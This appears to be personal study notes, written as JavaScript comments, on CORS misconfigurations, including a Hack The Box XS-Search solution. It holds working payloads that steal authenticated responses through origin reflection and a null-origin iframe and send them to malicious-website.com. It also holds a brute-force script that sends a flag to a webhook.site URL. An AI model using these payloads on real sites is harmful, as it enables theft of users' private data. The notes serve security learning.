// Cross-origin resource sharing
//! Definitions
//* CORS
// its a browser mechanism which enalbes controlled access to resources located
// outside of a given domain
//* Same-Origin Policy
// The same-origin policy restricts scripts on one origin from accessing data from another origin.
// An origin consists of a URI scheme, domain and port number.
//? note :
// a server can choose to allow cors so on respnose it sets the Access-Control-Allow-Origin header to *
//! Exploiting
//* Origin refletion
// if the server reflects the origin in the Access-Control-Allow-Origin header
// then you can set the origin to a domain you control and then you can access the response
// <script>
//    var req = new XMLHttpRequest();
//    req.onload = reqListener;
//    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
//    req.withCredentials = true;
//    req.send();
//
//    function reqListener() {
//    	location='//malicious-website.com/log?key='+this.responseText;
//    };
// </script>
//* White listed null origin
// sending origin : null
// will grant you access if it's whitelisted
// you can do that using this iframe
//<iframe
//  sandbox="allow-scripts allow-top-navigation allow-forms"
//  src="data:text/html
//  ,<script>
//    var req = new XMLHttpRequest();
//    req.onload = reqListener;
//    req.open('get','vulnerable-website.com/sensitive-victim-data',true);
//    req.withCredentials = true;
//    req.send();
//
//    function reqListener() {
//    location='malicious-website.com/log?key='+this.responseText;
//      };
//    </script>">
//</iframe>;
//* Exploiting XSS via CORS trust relationships
// If a website trusts an origin that is vulnerable to cross-site scripting (XSS),
// then an attacker could exploit the XSS to inject some JavaScript
// that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
//* Intranets and CORS without credentials
// if the Access-Control-Allow-Credentials header is not set to true
// the browser will not send the cookies
// but this is not the case for intranet applications
// usually this attack is used when the attacker can't acces the website directly
// so for example if an xss found in a trusted website by an internal service
// an attacker can go far because usually interal server don't get that much security
// because it's not exposed to the internet
//* Xs-Search
// in here we are using the fact that script.src=url
// if the response is 200 OK the onload event will be triggered
// and if the response is 404 Not Found the onerror event will be triggered
// even though we can't see the result of the request
// <body>
// <html>
// <script type="text/javascript">
//     flag_charset =
//       "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*,-[]_}";
//     var flag = "HTB{";
//     var charIndex = 0;
//     const bruteForce = () => {
//       var script = document.createElement("script");
//       script.src = `//127.0.0.1:1337/api/entries/search?q=${flag}${flag_charset.charAt(charIndex)}`;
//       document.body.appendChild(script);
//       script.onload = () => {
//         flag += flag_charset.charAt(charIndex);
//         charIndex = 0;
//         script.parentNode.removeChild(script);
//         if (flag.slice(-1) != '}') {
//           bruteForce();
//         }
//         else {
//           img = new Image();
//           img.src = 'http://webhook.site/6172d550-9833-4c2c-8805-4eec6c4f69f3?flag=' + flag;
//         }
//       }
//       script.onerror = () => {
//         script.parentNode.removeChild(script);
//         charIndex += 1;
//         bruteForce();
//       }
//     }
//     bruteForce();
//   </script>
// </body>
// </html>